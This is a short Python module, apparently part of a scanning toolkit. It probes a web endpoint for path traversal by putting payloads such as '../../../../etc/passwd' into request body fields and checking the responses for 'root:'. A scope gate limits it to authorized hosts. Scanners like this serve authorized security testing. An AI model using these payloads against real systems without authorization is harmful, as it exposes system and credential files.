import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from tools.gate_guarded_request import gate_guarded_request as ggr, is_url_allowed  # noqa: E402


def scan(input_data):
    target_url = input_data["target_url"]
    endpoint = input_data.get("endpoint", "")
    method = input_data.get("method", "GET")
    headers = input_data.get("headers", {})
    body = input_data.get("body", {})

    base_url = f"{target_url}{endpoint}"
    # SCOPE GATE (fail-closed): path-traversal probes only against an authorized host.
    allowed, reason = is_url_allowed(base_url)
    if not allowed:
        return {"confirmed": False, "scanned": False, "blocked_reason": reason}

    vulnerable = False
    successful_payload = None
    evidence = ""

    for key, value in body.items():
        if isinstance(value, str):
            for payload in ["../../../../etc/passwd", "../etc/passwd"]:
                modified_body = body.copy()
                modified_body[key] = payload
                response = ggr(method, base_url, headers=headers, json=modified_body)
                if response is None:
                    continue  # gate blocked -> no traffic
                if "root:" in response.text:
                    vulnerable = True
                    successful_payload = f"'{payload}'"
                    evidence = f"{response.status_code} {response.text}"
                    break
            if vulnerable:
                break

    return {"confirmed": vulnerable, "successful_payload": successful_payload,
            "scanned": True, "evidence": evidence}


def main():
    if len(sys.argv) < 2:
        print("Usage: python lfi_engine.py <json_input> [true|false]")
        sys.exit(1)
    print(json.dumps(scan(json.loads(sys.argv[1]))))
    sys.exit(0)


if __name__ == "__main__":
    main()